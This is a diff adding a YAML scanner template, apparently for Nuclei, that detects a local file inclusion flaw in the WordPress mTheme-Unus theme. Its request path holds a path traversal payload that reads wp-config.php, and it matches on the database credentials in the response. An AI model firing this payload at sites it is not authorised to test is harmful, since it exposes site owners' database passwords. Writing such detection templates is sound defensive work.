@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - DB_NAME
+            - DB_PASSWORD
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
+id: mthemeunus-lfi
+info:
+    author: dhiyaneshDk
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress mTheme-Unus Theme is vulnerable to local file inclusion via css.php.
+    metadata:
+        max-request: 1
+    name: WordPress mTheme-Unus Theme - Local File Inclusion
+    reference:
+        - https://wpscan.com/vulnerability/bc036ee3-9648-49db-ae52-3a58fdeb82eb
+        - https://packetstormsecurity.com/files/133778/
+    severity: high
+    tags:
+        - wpscan
+        - packetstorm
+        - wordpress
+        - wp-theme
+        - mtheme
+        - WordPress
+        - storm
